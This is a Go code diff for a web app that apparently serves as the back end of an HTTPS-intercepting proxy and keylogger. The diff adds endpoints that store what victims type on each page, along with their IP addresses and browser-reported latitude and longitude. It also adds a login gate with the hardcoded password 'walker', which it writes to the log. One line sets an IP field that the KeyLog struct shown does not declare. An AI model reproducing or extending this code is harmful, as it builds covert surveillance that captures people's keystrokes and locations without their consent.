@@ -6,11 +6,15 @@ import (
 	"io/ioutil"
 	"os"
 	"path/filepath"
+	"time"
+	"strings"
 )
 
 //the temporary object that stores the logged data.
 //probably should store to file for persistence
-var data []KeyLog
+var keylogs []KeyLog
+var locations []Location
+var password string
 //key logger object
 type KeyLog struct {
 	Page string //what page they were on when they typed it
@@ -18,6 +22,12 @@ type KeyLog struct {
 	Content string //what was typed
 	Timestamp string //the time at which it was typed
 	DomObject string //where the data was typed
+}
+type Location struct {
+	IP string
+	Latitude string
+	Longitude string
+	Timestamp string
 }
 /*
 struct for storing result from a filePath Walker
@@ -75,8 +85,8 @@ func KillProxy() {
 	}
 }
 
-func (c App) GetData() revel.Result {
-	return c.RenderJson(data)
+func (c App) GetKeylogs() revel.Result {
+	return c.RenderJson(keylogs)
 }
 
 func (c App) AppendData() revel.Result {
@@ -88,10 +98,35 @@ func (c App) AppendData() revel.Result {
 		var k KeyLog
 		k.Page = p
 		k.Content = d
-		data = append(data, k)
-		return c.RenderJson("updated")
+		t := time.Now().Local()
+		k.Timestamp = t.Format("20060102150405")
+		s := strings.Split(c.Request.RemoteAddr, ":")
+		ip := s[0]
+		k.IP = ip
+		keylogs = append(keylogs, k)
+		return c.RenderJson("logger updated")
 	}
 	return c.RenderJson("null")
+}
+
+func (c App) GetLocations() revel.Result {
+	return c.RenderJson(locations)
+}
+func (c App) CatchLocation() revel.Result {
+	var lat string
+	var lon string
+	c.Params.Bind(&lat, "latitude")
+	c.Params.Bind(&lon, "longitude")
+	var l Location
+	l.Latitude = lat
+	l.Longitude = lon
+	t := time.Now().Local()
+	l.Timestamp = t.Format("20060102150405")
+	s := strings.Split(c.Request.RemoteAddr, ":")
+	ip := s[0]
+	l.IP = ip
+	locations = append(locations, l)
+	return c.RenderJson("location updated")
 }
 
 func (c App) InterceptHTTPS() revel.Result {
@@ -123,13 +158,30 @@ func (c App) DeleteHars() revel.Result {
 	return c.RenderJson(w.files)
 }
 
+func (c App) Login() revel.Result {
+	var p string
+	c.Params.Bind(&p, "password")
+	log.Println("password: ", p)
+	if p == "walker" {
+		password = p
+		return c.Redirect("/App/Index")
+	}
+	return c.Render()
+}
 func (c App) Index() revel.Result {
 
-	log.Println(os.Getenv("HOME"))
-
-
 	initializeBlockReplaceLists()
-	return c.Render()
+	log.Println(os.Getenv("HOME"))
+	log.Println("password 2: ", password)
+	if password == "walker" {
+		return c.Render()
+	} else {
+		return c.Redirect("/App/Login")	
+	}
+	
+
+	
+	
 }
 
  func (w *Walker) deletefiles(path string, f os.FileInfo, err error) (e error) {
